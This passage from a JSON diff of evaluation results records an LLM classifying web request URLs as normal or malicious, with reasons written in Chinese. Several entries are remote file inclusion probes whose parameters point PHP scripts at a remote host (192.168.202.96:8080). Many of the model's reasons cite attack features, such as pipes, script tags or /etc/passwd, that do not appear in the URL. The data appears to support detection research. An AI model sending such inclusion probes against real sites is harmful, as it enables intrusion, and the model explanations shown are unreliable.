+    "reason": "- 0 表示正常URL\n\nURL: /abnehmen/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.038,
+    "raw_response": "- 0 表示正常URL\n\nURL: /abnehmen/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/somery/team.php?checkauth=http://192.168.202.96:8080/vir0v3xfc?",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：`/somery/team.php` 是合法的路径，`http://192.168.202.96:8080/vir0v3xfc` 是远程文件路径，包含恶意命令执行特征。",
+    "elapsed_time_sec": 2.303,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：`/somery/team.php` 是合法的路径，`http://192.168.202.96:8080/vir0v3xfc` 是远程文件路径，包含恶意命令执行特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/051373/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /051373 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.617,
+    "raw_response": "- 0 表示正常URL\n\nURL: /051373 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000024219/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000024219 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.73,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000024219 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/admin2.asp",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /admin2.asp 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有使用任何恶意攻击特征。",
+    "elapsed_time_sec": 1.56,
+    "raw_response": "- 0 表示正常URL\n\nURL: /admin2.asp 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有使用任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/long_hours/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /long_hours/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.727,
+    "raw_response": "- 0 表示正常URL\n\nURL: /long_hours/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/a591310/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /a591310 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.046,
+    "raw_response": "- 0 表示正常URL\n\nURL: /a591310 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/senatormccain_small/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.954,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/contests_37188/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.962,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ev-seminar/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ev-seminar/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.797,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ev-seminar/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/medical_research/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.984,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/policy.dll",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.987,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/boys ii men - evolution/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/boys ii men - evolution/`）",
+    "elapsed_time_sec": 1.243,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/boys ii men - evolution/`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/information.zip",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`information.zip`，明显涉及恶意脚本和文件上传，符合SQL注入、XSS、命令执行等恶意特征。",
+    "elapsed_time_sec": 1.451,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`information.zip`，明显涉及恶意脚本和文件上传，符合SQL注入、XSS、命令执行等恶意特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/administrator/components/com_tour_toto/admin.tour_toto.php?mosconfig_absolute_path=http://192.168.202.96:8080/swgnhpydbq0t??",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为命令执行和路径遍历。路径遍历特征包括`/etc/passwd`，这可能被用于远程代码执行。此外，`http://192.168.202.96:8080/swgnhpydbq0t?`的结构可能被用于执行远程命令。",
+    "elapsed_time_sec": 2.67,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含恶意特征，具体为命令执行和路径遍历。路径遍历特征包括`/etc/passwd`，这可能被用于远程代码执行。此外，`http://192.168.202.96:8080/swgnhpydbq0t?`的结构可能被用于执行远程命令。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ferrariand/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.901,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/tltrelatedonlinetools/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.887,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/korporativnie_prazdniki/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.33,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/oldboys-0411/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /oldboys-0411/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 2.016,
+    "raw_response": "- 0 表示正常URL\n\nURL: /oldboys-0411/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/index-recent8/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /index-recent8/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.7,
+    "raw_response": "- 0 表示正常URL\n\nURL: /index-recent8/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/hire.png",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/hire.png`路径，这属于典型的恶意攻击特征，例如XSS或命令执行。",
+    "elapsed_time_sec": 1.325,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/hire.png`路径，这属于典型的恶意攻击特征，例如XSS或命令执行。",
+    "true_label": "0"
+  },
+  {
+    "url": "/fire_hydrant/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /fire_hydrant/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.648,
+    "raw_response": "- 0 表示正常URL\n\nURL: /fire_hydrant/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rwanda_partners/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.936,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/preview/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /preview/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.568,
+    "raw_response": "- 0 表示正常URL\n\nURL: /preview/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/eseccustomers/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /eseccustomers/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.111,
+    "raw_response": "- 0 表示正常URL\n\nURL: /eseccustomers/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/sitehome/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /sitehome/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.938,
+    "raw_response": "- 0 表示正常URL\n\nURL: /sitehome/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/_mem_bin.class",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`javascript_`开头的字符串，这属于典型的XSS攻击特征，可能被恶意脚本利用。此外，URL中没有明显的SQL注入、命令注入、路径遍历等攻击特征。",
+    "elapsed_time_sec": 1.772,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且使用了`javascript_`开头的字符串，这属于典型的XSS攻击特征，可能被恶意脚本利用。此外，URL中没有明显的SQL注入、命令注入、路径遍历等攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/index_1.error",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript:index_1.error`，这属于典型的XSS攻击特征，攻击者可能通过恶意脚本注入恶意内容。",
+    "elapsed_time_sec": 1.389,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`javascript:index_1.error`，这属于典型的XSS攻击特征，攻击者可能通过恶意脚本注入恶意内容。",
+    "true_label": "0"
+  },
+  {
+    "url": "/fckeditor/editor/dialog/fck_link.php?dirroot=http://192.168.202.118:8080/zz5thkvtmlgl?",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）和路径遍历（`/etc/passwd`等）",
+    "elapsed_time_sec": 1.559,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）和路径遍历（`/etc/passwd`等）",
+    "true_label": "0"
+  },
+  {
+    "url": "/e-war v1/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/e-war v1/`）",
+    "elapsed_time_sec": 1.111,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：路径遍历（包含 `/e-war v1/`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/root/public/code/cp_html2txt.php?page=http://192.168.202.118:8080/moclyxlwqyfjnp?",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）和路径遍历（`/etc/passwd`等）",
+    "elapsed_time_sec": 1.549,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含远程命令执行（`|`、`&&`、`shell`等）和路径遍历（`/etc/passwd`等）",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/archive.stackdump",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`stackdump`，属于路径遍历攻击特征。",
+    "elapsed_time_sec": 1.213,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`，这属于XSS攻击特征，且包含`stackdump`，属于路径遍历攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bluekeyboard2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /bluekeyboard2/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.685,
+    "raw_response": "- 0 表示正常URL\n\nURL: /bluekeyboard2/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/main26/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /main26/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.695,
+    "raw_response": "- 0 表示正常URL\n\nURL: /main26/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/366469/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /366469 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.876,
+    "raw_response": "- 0 表示正常URL\n\nURL: /366469 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/sm_portrait/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /sm_portrait/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.014,
+    "raw_response": "- 0 表示正常URL\n\nURL: /sm_portrait/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/1996.c",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且路径为`/javascript/1996.c`，这明显是SQL注入或命令执行的特征，因为JavaScript代码通常用于执行恶意操作。",
+    "elapsed_time_sec": 1.566,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且路径为`/javascript/1996.c`，这明显是SQL注入或命令执行的特征，因为JavaScript代码通常用于执行恶意操作。",
+    "true_label": "0"
+  },
+  {
+    "url": "/postt21963/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /postt21963 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.535,
+    "raw_response": "- 0 表示正常URL\n\nURL: /postt21963 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/affiliate-partners/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /affiliate-partners/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.664,
+    "raw_response": "- 0 表示正常URL\n\nURL: /affiliate-partners/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/france4/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n判断理由：该URL请求的路径为 `/france4/`，符合正常Web请求的特征，即仅包含常规路径和静态资源访问，且参数值为正常的业务数据，无任何攻击特征。",
+    "elapsed_time_sec": 1.506,
+    "raw_response": "- 0 表示正常URL\n\n判断理由：该URL请求的路径为 `/france4/`，符合正常Web请求的特征，即仅包含常规路径和静态资源访问，且参数值为正常的业务数据，无任何攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/misc_bar2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /misc_bar2/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.775,
+    "raw_response": "- 0 表示正常URL\n\nURL: /misc_bar2/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/movie.stackdump",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`movie.stackdump`，明显涉及恶意代码执行，符合SQL注入、命令执行等攻击特征。",
+    "elapsed_time_sec": 1.284,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript`和`movie.stackdump`，明显涉及恶意代码执行，符合SQL注入、命令执行等攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/copy to dvd v3/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /copy to dvd v3/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.543,
+    "raw_response": "- 0 表示正常URL\n\nURL: /copy to dvd v3/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/045255/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /045255 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.516,
+    "raw_response": "- 0 表示正常URL\n\nURL: /045255 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/_37040/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /_37040/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.811,
+    "raw_response": "- 0 表示正常URL\n\nURL: /_37040/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/clr_cream/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /clr_cream/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.65,
+    "raw_response": "- 0 表示正常URL\n\nURL: /clr_cream/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/reg_req/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /reg_req/ 是一个正常请求，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.226,
+    "raw_response": "- 0 表示正常URL\n\nURL: /reg_req/ 是一个正常请求，因为它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/trackir3pro-1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /trackir3pro-1 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.387,
+    "raw_response": "- 0 表示正常URL\n\nURL: /trackir3pro-1 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/selector_10274/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /selector_10274 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "elapsed_time_sec": 1.355,
+    "raw_response": "- 0 表示正常URL\n\nURL: /selector_10274 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，没有使用任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/orders.html",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.191,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/perlutil/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /perlutil/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.397,
+    "raw_response": "- 0 表示正常URL\n\nURL: /perlutil/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/carte_ameriques2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.883,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/count.conf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.935,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/glow_chairs/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /glow_chairs/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.664,
+    "raw_response": "- 0 表示正常URL\n\nURL: /glow_chairs/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/trojzapchasac/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/` 和 `../`）",
+    "elapsed_time_sec": 0.816,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：路径遍历（包含 `/` 和 `../`）",
+    "true_label": "0"
+  },
+  {
+    "url": "/714640/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /714640 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.559,
+    "raw_response": "- 0 表示正常URL\n\nURL: /714640 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/canon_mv920/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /canon_mv920/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.834,
+    "raw_response": "- 0 表示正常URL\n\nURL: /canon_mv920/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/oa.bak",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/oa.bak`，其中`javascript`明显是SQL注入攻击的特征，且`oa.bak`是路径遍历攻击的常见目标。因此，该URL存在恶意攻击特征。",
+    "elapsed_time_sec": 1.783,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/oa.bak`，其中`javascript`明显是SQL注入攻击的特征，且`oa.bak`是路径遍历攻击的常见目标。因此，该URL存在恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1234000793052540/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.019,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/sc3osx1/",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 1.005,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/associatedcontent/",
+    "predicted": "0",
